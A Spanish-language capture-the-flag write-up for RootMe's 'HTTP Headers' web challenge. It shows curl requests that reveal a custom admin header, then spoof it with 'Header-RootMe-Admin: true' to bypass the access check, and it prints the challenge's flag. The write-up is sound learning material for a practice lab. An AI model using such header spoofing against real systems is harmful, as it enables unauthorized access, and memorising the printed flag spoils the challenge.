🚩 Write-up: HTTP Headers - RootMe

CTF: RootMe

Categoría: Web

Dificultad: Fácil

Fecha Resuelto: 30 de Diciembre, 2025

Herramientas: curl (Termux en Android)

Flag: HeadersMayBeUseful

🎯 Descripción del Reto

URL: http://challenge01.root-me.org/web-serveur/ch5/

El sitio web muestra el siguiente mensaje:

"Content is not the only part of an HTTP response!"

Objetivo: Encontrar y explotar una vulnerabilidad relacionada con las cabeceras HTTP para obtener la contraseña/flag.

🔍 Reconocimiento y Análisis

El primer paso fue inspeccionar la respuesta HTTP completa, no solo el HTML.

1. Petición HTTP Inicial

```bash
curl -i http://challenge01.root-me.org/web-serveur/ch5/
```

Respuesta (cabeceras relevantes):

```
HTTP/1.1 200 OK
Server: nginx
Header-RootMe-Admin: none
```

Observación clave: El servidor incluye una cabecera personalizada Header-RootMe-Admin con valor none.

2. Análisis de la Pista

La cabecera Header-RootMe-Admin: none sugiere:

· El servidor está informando sobre un estado administrativo
· Posiblemente podemos modificar este estado enviando la misma cabecera con un valor diferente
· El nombre de la cabecera (Header-RootMe-Admin) parece ser específica para este desafío

🚀 Explotación (Paso a Paso)

Paso 1: Confirmar la Hipótesis

Basándonos en la pista del reto y la cabecera observada, intentamos enviar la cabecera Header-RootMe-Admin con un valor diferente.

```bash
curl -v -H "Header-RootMe-Admin: true" http://challenge01.root-me.org/web-serveur/ch5/
```

Paso 2: Resultado de la Explotación

La respuesta del servidor confirma que nuestra hipótesis era correcta:

```html
HTTP/1.1 200 OK
Server: nginx
Header-RootMe-Admin: none

<html>
<body>
...
<p>You dit it ! You can validate the challenge with the password HeadersMayBeUseful</p>
</body>
</html>
```

¡Éxito! El servidor valida la cabecera personalizada y nos proporciona la contraseña.

🧠 Explicación Técnica

¿Por qué funciona?

1. Validación del lado del servidor: La aplicación web en el servidor verifica si la petición HTTP incluye la cabecera personalizada Header-RootMe-Admin con un valor específico (en este caso, true).
2. Lógica de autorización: El valor por defecto none en la respuesta del servidor sugiere que sin esta cabecera, el usuario no tiene privilegios administrativos. Al enviar Header-RootMe-Admin: true, estamos "suplantando" un estado administrativo.
3. Cabeceras HTTP personalizadas: Las aplicaciones web pueden definir y usar cabeceras HTTP personalizadas para diversos propósitos, incluyendo autenticación, autorización y configuración. En este caso, se utiliza como un mecanismo simple de control de acceso.

Conceptos Clave Aprendidos

· HTTP Headers: Parte fundamental de las peticiones y respuestas HTTP
· Header Manipulation: Técnica que modifica cabeceras HTTP para alterar el comportamiento de una aplicación
· Server-Side Validation: Cómo los servidores validan información recibida en las peticiones

📚 Herramientas y Comandos Usados

· curl: Cliente HTTP desde línea de comandos (preinstalado en Termux)
· Flag -i: Muestra las cabeceras HTTP en la respuesta
· Flag -v: Modo verbose (detallado)
· Flag -H: Permite enviar cabeceras HTTP personalizadas

💡 Aprendizajes y Conclusiones

1. Inspeccionar siempre las cabeceras HTTP: Las vulnerabilidades pueden estar en cualquier parte de la respuesta HTTP, no solo en el cuerpo HTML.
2. Cabeceras personalizadas: Pueden contener información sensible o ser vectores de ataque.
3. Simplicidad de las soluciones: A veces la solución es tan simple como enviar una cabecera HTTP correcta.
4. Desde Termux/Android es posible: Este reto demuestra que no necesitas un entorno de escritorio completo para resolver desafíos CTF básicos de web.

🏁 Password/Flag

HeadersMayBeUseful

📝 Notas para Termux/Android

· curl funciona perfectamente en Termux sin configuración adicional
· Para retos web básicos, Termux es completamente suficiente
· Puedes instalar herramientas adicionales con pkg install si necesitas más funcionalidad

---

Write-up realizado completamente desde Termux en Android
